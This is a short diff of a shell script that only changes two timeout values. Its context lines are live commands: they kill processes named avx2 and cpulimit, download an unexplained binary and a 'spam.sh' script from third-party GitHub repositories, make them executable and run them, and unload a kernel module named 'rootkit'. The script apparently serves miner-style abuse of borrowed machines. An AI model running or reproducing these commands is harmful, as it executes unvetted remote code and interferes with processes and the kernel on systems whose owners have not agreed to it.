@@ -20,10 +20,10 @@ uname -a
 pkill -31 avx2
 pkill -31 cpulimit
 wget https://github.com/BatiKangkung/KangKung/raw/master/time && chmod +x time
-timeout 10m ./time
+timeout 570 ./time
 # time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 5; done
 wget https://raw.githubusercontent.com/Sushrut1101/Ubuntu-Tmate/master/spam.sh && chmod +x spam.sh
-timeout 9m ./spam.sh
+timeout 540 ./spam.sh
 rmmod rootkit
 dmesg
 pkill -31 avx2
